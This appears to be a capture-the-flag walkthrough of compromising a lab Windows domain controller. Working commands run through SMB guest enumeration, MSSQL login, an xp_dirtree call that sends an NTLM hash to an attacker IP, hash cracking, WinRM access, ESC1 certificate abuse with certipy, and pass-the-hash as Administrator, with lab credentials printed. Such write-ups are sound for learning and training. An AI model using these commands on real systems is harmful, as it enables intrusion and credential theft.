- The first step is to perform a scan of the open ports and then list the versions and technologies used on the open ports.
	
	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.11.202 -oG scan
	/opt/extractports scan
	nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49709,49720 -sCV -Pn 10.10.11.202 -oN ports
	```

-  I found the domain `sequel.htb`, I added it to the file in the `hosts` file

- When I see an open port with a dns service, I list the mail servers and find another domain that I add to the `hosts` file.
	
	```python
	dig @10.10.11.202 sequel.htb mx
	```

- Ready the shared resources by smb with guest credentials.
	
	```python
	netexec smb 10.10.11.202 -u guest -p "" --shares
	```

- Seeing that I have read permissions on the IPC$ folder, I can list the system users.
	
	```python
	impacket-lookupsid  sequel.htb/Guest@10.10.11.202
	```

- As I also have read permissions on the Public folder, I connect to it and find a pdf file 
	
	```python
	smbclient -U guest \\\\10.10.11.202\\Public
	```

- Inside the document we find some credentials to connect to Microsoft SQL Server

- I log on and start looking for something interesting within the boards but find nothing remarkable. I also don't have the possibility to execute system commands
	
	```python
	impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
	```

- After checking the tables for information and not finding anything, I decide to stay on listen with reply and make a query against my ip to see the NTLMv2 hash.

```python
EXEC master..xp_dirtree "\\10.10.14.24\share\"
```

![image](https://github.com/user-attachments/assets/f99c1007-9fac-4034-81e5-faee86c842cd)

- I break the hash and get to see the clear text password of the sql_svc user. 
	
	```python
	hashcat -m 5600  hash /usr/share/wordlists/rockyou.txt --show
	```

- With this user I connect to the system via winrm and after enumerating the system I find a sql server log file. Inside I find the credentials of the user Ryan.Cooper in clear text.
	
	```python
	evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
	```

  ![image](https://github.com/user-attachments/assets/3a6f9043-8025-4abe-b962-f5762141f785)

- With this credentials I list the certificate templates. I find that with these credentials it is vulnerable to an ESC1 attack.
	
	```python
	certipy-ad find -u Ryan.Cooper -p NuclearMosquito3  -dc-ip 10.10.11.202 -stdout -enabled -vulnerable
	```
	
	![image](https://github.com/user-attachments/assets/a5e1444a-dc5e-450b-aa24-aea4623ffd20)

- Following the steps to exploit [ESC1](https://adminions.ca/books/adcs-abusing-active-directory-certificate-service/page/esc1), we can obtain a .pfx file with which we can connect to the system.  
	
	```python
	certipy-ad req -u Ryan.Cooper@sequel.htb -p "NuclearMosquito3" -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -dc-ip 10.10.11.202
	```
	
  ![image](https://github.com/user-attachments/assets/e4b12e23-a9c6-447e-9c3b-ed04cfaae640)

- Authenticate with the certificate to obtain the administrator's nt hash
	
	```python
	certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.202
	```
	
	![image](https://github.com/user-attachments/assets/ff1f3a32-382e-4f15-bed3-534c7fc314b5)

- With this hash we connect to the system and manage to read the second flag.
	
	```python
	evil-winrm -i 10.10.11.202 -u Administrator  -H a52f78e4c751e5f5e17e1e9f3e58f4ee
	```
